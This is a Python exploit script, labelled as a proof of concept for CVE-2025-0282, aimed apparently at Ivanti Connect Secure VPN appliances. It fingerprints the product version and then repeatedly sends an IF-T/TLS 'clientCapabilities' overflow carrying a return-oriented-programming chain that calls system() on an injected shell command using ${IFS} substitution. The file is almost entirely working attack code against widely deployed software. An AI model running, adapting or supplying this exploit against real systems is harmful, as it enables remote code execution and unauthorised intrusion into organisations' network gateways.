import sys
import socket
import ssl
import struct
import argparse
from urllib.parse import urlparse
import requests
requests.packages.urllib3.disable_warnings()

def log(txt):
    print(txt)

def get_productversion(ip, port):
    try:
        url = f"https://{ip}:{port}/dana-na/auth/url_admin/welcome.cgi?type=inter"
        response = requests.get(url, verify=False, timeout=10)
        if response.status_code == 200:
            import re
            match = re.search(r'name="productversion"\s+value="(\d+.\d+.\d+.\d+)"', response.text)
            if match:
                return match.group(1)
    except Exception as e:
        log(f"[-] Error getting product version: {str(e)}")
    return None

def exploit(target_ip, target_port):
    log(f"[+] Targeting {target_ip}:{target_port}")

    productversion = get_productversion(target_ip, target_port)
    if not productversion:
        log("[-] Could not get product version")
        return

    log(f"[+] Detected version {productversion}")

    # Target configuration (example values - needs actual target-specific values)
    targets = {
        '22.7.2.3597': {
            'padding_to_vftable': 2288,
            'vftable_gadget_offset': 0x00934365 + 2,
            'padding_to_next_frame': 2934,
            'offset_to_got_plt': 0x00157c000,
            'gadget_inc_ebx_ret': 0x01338373,
            'gadget_mov_eax_esp_retn_c': 0x00ca2e84,
            'gadget_add_eax_8_ret': 0x007a040c,
            'gadget_mov_esp_eax_call_system': 0x004f0df3,
        }
    }

    target = targets.get(productversion)
    if not target:
        log(f"[-] No target configuration for version {productversion}")
        return

    attempt = 0
    libdsplibs_base = 0xf6492000  # Example base address

    for _ in range(2048):
        try:
            # Create socket connection
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)

            if target_port == 443:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                s = context.wrap_socket(sock, server_hostname=target_ip)
                s.connect((target_ip, target_port))
            else:
                s = sock
                s.connect((target_ip, target_port))

            # Send initial HTTP request
            http_request = (
                f"GET / HTTP/1.1\r\n"
                f"Host: {target_ip}:{target_port}\r\n"
                "User-Agent: AnyConnect-compatible OpenConnect VPN Agent v9.12-188-gaebfabb3-dirty\r\n"
                "Content-Type: EAP\r\n"
                "Upgrade: IF-T/TLS 1.0\r\n"
                "Content-Length: 0\r\n\r\n"
            ).encode()

            s.sendall(http_request)
            response = s.recv(4096)
            if b'101 Switching Protocols' not in response:
                log("[-] Failed protocol upgrade")
                continue

            # Send version negotiation
            version_data = struct.pack('>4B', 0, 1, 2, 2)
            version_header = struct.pack(
                '>4I',
                0x00005597,  # VENDOR_TCG
                0x00000001,  # IFT_VERSION_REQUEST
                len(version_data) + 16,
                0            # seq id
            )
            s.sendall(version_header + version_data)

            # Build exploit payload
            attempt += 1
            buffer = b'C' * target['padding_to_vftable']
            buffer += struct.pack('<I', libdsplibs_base + target['vftable_gadget_offset'])
            buffer += b'A' * target['padding_to_next_frame']
            buffer += struct.pack('<I', libdsplibs_base + target['offset_to_got_plt'] - 1)
            buffer += struct.pack('<I', 0xCAFEBEEF)  # esi
            buffer += struct.pack('<I', 0xCAFEBEEF)  # edi
            buffer += struct.pack('<I', 0xCAFEBEEF)  # ebp
            buffer += struct.pack('<I', libdsplibs_base + target['gadget_inc_ebx_ret'])
            buffer += struct.pack('<I', libdsplibs_base + target['gadget_mov_eax_esp_retn_c'])
            buffer += struct.pack('<I', libdsplibs_base + target['gadget_add_eax_8_ret'])
            buffer += b'\xEF\xBE\xFE\xCA' * 3  # Padding
            buffer += struct.pack('<I', libdsplibs_base + target['gadget_add_eax_8_ret']) * 4
            buffer += struct.pack('<I', libdsplibs_base + target['gadget_mov_esp_eax_call_system'])
            buffer += struct.pack('<I', 0xCAFEBEEF)
            cmd = f"touch /var/tmp/haxor_{attempt}; #".replace(' ', '${IFS}').encode()
            buffer += cmd

            # Check for bad characters
            if b'\x00' in buffer:
                log("[-] Null byte in payload")
                continue

            # Build final payload
            payload = f"clientHostName=abcdefgh clientIp=127.0.0.1 clientCapabilities=".encode()
            payload += buffer
            payload += b"\n\x00"

            header = struct.pack(
                '>4I',
                0x00000a4c,  # VENDOR_JUNIPER
                0x00000088,  # Type
                len(payload) + 16 - 4,  # Length adjustment
                1            # seq id
            )

            log(f"[*] Triggering attempt #{attempt}...")
            s.sendall(header + payload)
            s.close()

        except (ConnectionRefusedError, ConnectionResetError, TimeoutError) as e:
            log(f"[-] Connection error: {str(e)}")
            continue
        except Exception as e:
            log(f"[-] Error: {str(e)}")
            break

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="CVE-2025-0282 PoC")
    parser.add_argument('-t', '--target', required=True, help='Target IP address')
    parser.add_argument('-p', '--port', type=int, default=443, help='Target port')
    args = parser.parse_args()

    if not args.target:
        parser.print_help()
        sys.exit(1)

    exploit(args.target, args.port)